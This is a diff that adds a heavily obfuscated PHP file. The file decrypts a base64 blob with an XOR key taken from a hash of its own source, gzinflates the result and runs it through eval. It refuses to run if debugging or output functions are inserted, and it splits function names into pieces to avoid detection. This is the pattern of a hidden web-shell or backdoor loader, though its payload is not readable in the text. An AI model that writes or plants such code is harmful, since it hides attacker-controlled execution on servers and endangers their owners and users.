@@ -1,0 +1,24 @@
+<?php
+$wnxdcqyvlak="35a1cc08a8dfb04cd1c53afb5af30ccf";
+$ketqvwcvb="520355040201565e505906570102065753080002020700550607040408570005";
+$eentwqnixfpr="7GLberpSdptm70jzqqaE9CCdFdJGf/NvmiLlAy1Q2uo6CiYS0/9nfMq+FYewcDnpwZgxVI6RiNnu++cjbEdw8TXeBlau9k0zGSwAETSBK72N2W2f0wPHu6OVEjD3vkq25x8n155CB68MXnE7GaI4EW73oGXA38NTH4dDXueyziwg7V7X7rCVp1T+sBnhJKJCnOwVNZVtBDHS8LIjbfbGSaNI9WSf0hR+8q+czx0+dGEraps68AXHhafsdqQo7nV3sRnJxOXaFRQmoEO1Iag6YviYYIxppPKEl/alvikLmtqpDp6J9wfV+ifnGGHoCyYRT4fvjaXeAu2/tseIMaAb3ODYB3WT7gP8SiYEqWzXfXYsJN185d91h4qDerb2c7Nnqv7p4hresRK9rtKK1NHKX/aUyOFl0jMhvC2HGSSNP6mrZrAuTz1VPOV8WXt+V1lx78wSlPEN7Hy6RknRx15lIRFGNvjUdOOal9h46XISp0h3KDo4ZBsLUOUyeArSwRlT2y7l3p+Xk4ZbKe1+pLGpCouFnzBHHlPb8JBUK4V1uS4Rm4Tkd5ExdRfFoIXT+Qqx+dSWUw4ksMFQHz0m1c+4+1WGyKF4Ps+J/N378yZ1RgCGQrePsnWBP4uXJnsy5wTTevshbb84PsLtq6T2Tp9Pu+j/7PZci5df53n8zq3/if3uRw5ZeAqeoLg8rrYU8lz0OvLz0/Kpn9G6PC7buoe2yNb1wjV+aT+DbehGBSnWeaBY/xmxz2c+MuUgSZnzdgno+zbFiEayXWbTtr+PPgwdbijhqKLoI+K6dMvQjEXryhtUkzwc2NWxoQtIbkkqnj5gEpywjUJpCKVCQI8h5kf1EXSkZ9o5EZo6w2/Sg6928DiBgZ50JrRb6vobY8G7Rvp3SIgzvluPg/UBPFoNmzE=";
+$thuckqoa=file_get_contents(__FILE__);
+$unjdjpqtkcu=str_replace($eentwqnixfpr,"",$thuckqoa);
+if(strpos($unjdjpqtkcu,"ec"."ho")!==false||strpos($unjdjpqtkcu,"pr"."int")!==false||strpos($unjdjpqtkcu,"var_"."dump")!==false||strpos($unjdjpqtkcu,"file_put_"."contents")!==false||strpos($unjdjpqtkcu,"fw"."rite")!==false){die();}
+$fzjxqbz=str_replace(array($wnxdcqyvlak,$ketqvwcvb),array("SP_29630f8f","KP_ec01743a"),$thuckqoa);
+$sztgvhofzvc=md5($fzjxqbz);
+$dgulkuothbof=hex2bin($ketqvwcvb);
+$dpcbtuwh="";
+$anwnlbtsodf=strlen($sztgvhofzvc);
+for($iqamgc=0;$iqamgc<$anwnlbtsodf;$iqamgc++){
+    $dpcbtuwh.=chr(ord($dgulkuothbof[$iqamgc])^ord($sztgvhofzvc[$iqamgc]));
+}
+$juvlhjsuazwv=base64_decode($eentwqnixfpr);
+$wqmmps=strlen($juvlhjsuazwv);
+$qedwrkh="";
+$cnpizsjhjj=strlen($dpcbtuwh);
+for($iqamgc=0;$iqamgc<$wqmmps;$iqamgc++){
+    $qedwrkh.=$juvlhjsuazwv[$iqamgc]^$dpcbtuwh[$iqamgc%$cnpizsjhjj];
+}
+$jymsff="gz"."in"."fl"."ate";
+eval($jymsff($qedwrkh));
